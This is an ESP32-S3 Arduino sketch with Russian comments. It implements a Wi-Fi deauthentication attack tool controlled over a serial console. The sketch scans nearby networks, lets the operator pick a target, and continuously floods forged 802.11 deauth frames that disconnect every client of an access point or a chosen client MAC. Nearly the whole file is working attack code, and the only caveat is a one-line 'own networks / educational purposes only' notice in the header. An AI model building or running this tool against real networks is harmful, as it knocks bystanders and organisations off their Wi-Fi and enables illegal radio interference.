/*
 * ESP32-S3 Wi-Fi Deauth CLI
 * 
 * Serial CLI (115200 бод):
 *   l — вывести список Wi-Fi сетей (динамически, с номерами)
 *   r — обновить список
 *   0..N — выбрать сеть по номеру и начать атаку
 *   s — остановить атаку
 *   b — broadcast-режим (отключить всех клиентов выбранной AP)
 *   t — атаковать конкретного клиента (ввести MAC вручную)
 *   i — показать текущий статус
 * 
 * Индикация:
 *   Красный LED (GPIO 4) — мигает раз в 5 сек, когда атака НЕ активна
 *   Зелёный LED (GPIO 5) — быстро мигает, когда атака АКТИВНА
 * 
 * RST — аппаратный сброс, атака прекращается.
 * BOOT (GPIO0) — быстрая остановка атаки (аналог команды 's').
 * 
 * ВНИМАНИЕ: только для собственных сетей / образовательных целей!
 */

#include <WiFi.h>
#include <esp_wifi.h>

// ==================== НАСТРОЙКИ ====================
#define RED_LED_PIN    4
#define GREEN_LED_PIN  5
#define BOOT_BUTTON    0

#define RED_BLINK_INTERVAL   5000
#define GREEN_BLINK_INTERVAL 100

#define MAX_NETWORKS 30

// ==================== СТРУКТУРЫ ====================
struct NetworkInfo {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
  wifi_auth_mode_t auth;
};

// ==================== ГЛОБАЛЬНЫЕ ====================
NetworkInfo networks[MAX_NETWORKS];
int networkCount = 0;

volatile bool attackActive = false;
uint8_t targetBSSID[6];
uint8_t targetChannel = 1;
bool broadcastMode = true;   // true = всех, false = конкретный клиент
uint8_t targetClient[6];     // MAC клиента, если не broadcast

volatile bool buttonPressed = false;
unsigned long lastDebounce = 0;

unsigned long lastRedBlink = 0;
unsigned long lastGreenBlink = 0;
bool redState = false, greenState = false;

// ==================== ПРОТОТИПЫ ====================
void IRAM_ATTR onBootButton();
void printMenu();
void scanNetworks();
void printNetworks();
void startAttack(int index);
void stopAttack();
void sendDeauth();
void updateLEDs();
void processSerial();
void printStatus();
void printMAC(const uint8_t *mac);
bool parseMAC(const String &s, uint8_t *out);
int findNetworkByBSSID(const uint8_t *bssid);

// ==================== SETUP ====================
void setup() {
  Serial.begin(115200);
  delay(1000);

  pinMode(RED_LED_PIN, OUTPUT);
  pinMode(GREEN_LED_PIN, OUTPUT);
  digitalWrite(RED_LED_PIN, LOW);
  digitalWrite(GREEN_LED_PIN, LOW);

  pinMode(BOOT_BUTTON, INPUT_PULLUP);
  attachInterrupt(digitalPinToInterrupt(BOOT_BUTTON), onBootButton, FALLING);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  Serial.println("\n\n=== ESP32-S3 Wi-Fi Deauth CLI ===");
  printMenu();

  // Первое сканирование
  scanNetworks();
  printNetworks();
}

// ==================== LOOP ====================
void loop() {
  processSerial();

  // Кнопка BOOT — экстренная остановка
  if (buttonPressed) {
    unsigned long now = millis();
    if (now - lastDebounce > 50) {
      lastDebounce = now;
      if (attackActive) {
        stopAttack();
      }
    }
    buttonPressed = false;
  }

  // Атака
  if (attackActive) {
    // Шлём пачку кадров, потом короткая пауза, чтобы успевать читать Serial
    for (int i = 0; i < 50; i++) {
      sendDeauth();
    }
    delay(10);
  }

  updateLEDs();
}

// ==================== SERIAL CLI ====================
void processSerial() {
  if (!Serial.available()) return;

  String line = Serial.readStringUntil('\n');
  line.trim();
  if (line.length() == 0) return;

  char cmd = tolower(line.charAt(0));

  switch (cmd) {
    case 'l':
      scanNetworks();
      printNetworks();
      break;

    case 'r':
      Serial.println("[*] Обновление списка...");
      scanNetworks();
      printNetworks();
      break;

    case 's':
      stopAttack();
      break;

    case 'i':
      printStatus();
      break;

    case 'b':
      if (!attackActive) {
        Serial.println("[!] Сначала выберите сеть (команда с номером).");
      } else {
        broadcastMode = true;
        Serial.println("[*] Режим: BROADCAST (все клиенты)");
      }
      break;

    case 't': {
      if (!attackActive) {
        Serial.println("[!] Сначала выберите сеть.");
        break;
      }
      Serial.println("[?] Введите MAC клиента (AA:BB:CC:DD:EE:FF):");
      unsigned long t0 = millis();
      while (!Serial.available() && millis() - t0 < 10000) delay(10);
      if (!Serial.available()) { Serial.println("[!] Таймаут."); break; }
      String macStr = Serial.readStringUntil('\n');
      macStr.trim();
      if (parseMAC(macStr, targetClient)) {
        broadcastMode = false;
        Serial.print("[*] Режим: TARGETED -> ");
        printMAC(targetClient);
        Serial.println();
      } else {
        Serial.println("[!] Неверный MAC.");
      }
      break;
    }

    case 'h':
    case '?':
      printMenu();
      break;

    default:
      // Попытка распарсить число — выбор сети
      if (isDigit(cmd)) {
        int idx = line.toInt();
        if (idx >= 0 && idx < networkCount) {
          startAttack(idx);
        } else {
          Serial.println("[!] Неверный номер. Введите 'l' для списка.");
        }
      } else {
        Serial.println("[?] Неизвестная команда. 'h' — помощь.");
      }
      break;
  }
}

// ==================== МЕНЮ ====================
void printMenu() {
  Serial.println("\n--- Команды ---");
  Serial.println("  l       — список Wi-Fi сетей");
  Serial.println("  r       — обновить список");
  Serial.println("  <N>     — атаковать сеть под номером N");
  Serial.println("  s       — остановить атаку");
  Serial.println("  b       — broadcast-режим (все клиенты)");
  Serial.println("  t       — атаковать конкретного клиента (MAC)");
  Serial.println("  i       — статус");
  Serial.println("  h / ?   — это меню");
  Serial.println("---------------\n");
}

// ==================== СКАНЕР ====================
void scanNetworks() {
  Serial.println("[*] Сканирование...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int n = WiFi.scanNetworks(false, true); // async=false, show_hidden=true
  networkCount = 0;

  if (n <= 0) {
    Serial.println("[!] Сети не найдены.");
    return;
  }

  for (int i = 0; i < n && networkCount < MAX_NETWORKS; i++) {
    networks[networkCount].ssid    = WiFi.SSID(i);
    networks[networkCount].rssi    = WiFi.RSSI(i);
    networks[networkCount].channel = WiFi.channel(i);
    networks[networkCount].auth    = WiFi.encryptionType(i);

    uint8_t *b = WiFi.BSSID(i);
    if (b) memcpy(networks[networkCount].bssid, b, 6);

    if (networks[networkCount].ssid.length() == 0)
      networks[networkCount].ssid = "<hidden>";

    networkCount++;
  }

  WiFi.scanDelete();
}

void printNetworks() {
  Serial.println("\n=== Доступные сети ===");
  Serial.println("№  | SSID                           | RSSI | CH | BSSID");
  Serial.println("---|--------------------------------|------|----|-------------------");
  for (int i = 0; i < networkCount; i++) {
    char buf[80];
    snprintf(buf, sizeof(buf), "%-2d | %-30s | %4d | %2d | ",
             i,
             networks[i].ssid.c_str(),
             networks[i].rssi,
             networks[i].channel);
    Serial.print(buf);
    printMAC(networks[i].bssid);
    Serial.println();
  }
  Serial.println("Введите номер для атаки или 'h' для помощи.\n");
}

// ==================== СТАРТ / СТОП ====================
void startAttack(int index) {
  if (index < 0 || index >= networkCount) return;

  memcpy(targetBSSID, networks[index].bssid, 6);
  targetChannel = networks[index].channel;
  broadcastMode = true;

  Serial.print("[*] Цель: ");
  Serial.print(networks[index].ssid);
  Serial.print("  BSSID=");
  printMAC(targetBSSID);
  Serial.print("  CH=");
  Serial.println(targetChannel);

  // Включаем promiscuous mode
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

  attackActive = true;
  Serial.println(">>> АТАКА ЗАПУЩЕНА (broadcast). 's' — стоп.");
}

void stopAttack() {
  if (!attackActive) {
    Serial.println("[*] Атака и так не активна.");
    return;
  }
  attackActive = false;
  esp_wifi_set_promiscuous(false);
  Serial.println("<<< АТАКА ОСТАНОВЛЕНА.");
}

// ==================== DEAUTH ====================
void sendDeauth() {
  uint8_t frame[26] = {
    0xC0, 0x00,                         // Frame Control: Deauth
    0x00, 0x00,                         // Duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (заполним)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source = BSSID (заполним)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (заполним)
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason: Class 3 frame
  };

  if (broadcastMode) {
    // На всех клиентов
    memset(&frame[4], 0xFF, 6);
  } else {
    memcpy(&frame[4], targetClient, 6);
  }

  memcpy(&frame[10], targetBSSID, 6);
  memcpy(&frame[16], targetBSSID, 6);

  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}

// ==================== LED ====================
void updateLEDs() {
  unsigned long now = millis();

  if (!attackActive) {
    if (now - lastRedBlink >= RED_BLINK_INTERVAL) {
      lastRedBlink = now;
      redState = !redState;
      digitalWrite(RED_LED_PIN, redState ? HIGH : LOW);
    }
    digitalWrite(GREEN_LED_PIN, LOW);
    greenState = false;
  } else {
    if (now - lastGreenBlink >= GREEN_BLINK_INTERVAL) {
      lastGreenBlink = now;
      greenState = !greenState;
      digitalWrite(GREEN_LED_PIN, greenState ? HIGH : LOW);
    }
    digitalWrite(RED_LED_PIN, LOW);
    redState = false;
  }
}

// ==================== УТИЛИТЫ ====================
void IRAM_ATTR onBootButton() {
  buttonPressed = true;
}

void printMAC(const uint8_t *mac) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  Serial.print(buf);
}

bool parseMAC(const String &s, uint8_t *out) {
  int v[6];
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
             &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
  for (int i = 0; i < 6; i++) {
    if (v[i] < 0 || v[i] > 255) return false;
    out[i] = (uint8_t)v[i];
  }
  return true;
}

void printStatus() {
  Serial.println("\n--- Статус ---");
  Serial.print("Атака: ");
  Serial.println(attackActive ? "АКТИВНА" : "остановлена");
  if (attackActive) {
    Serial.print("Цель BSSID: ");
    printMAC(targetBSSID);
    Serial.println();
    Serial.print("Канал: ");
    Serial.println(targetChannel);
    Serial.print("Режим: ");
    Serial.println(broadcastMode ? "BROADCAST" : "TARGETED");
  }
  Serial.println("--------------\n");
}
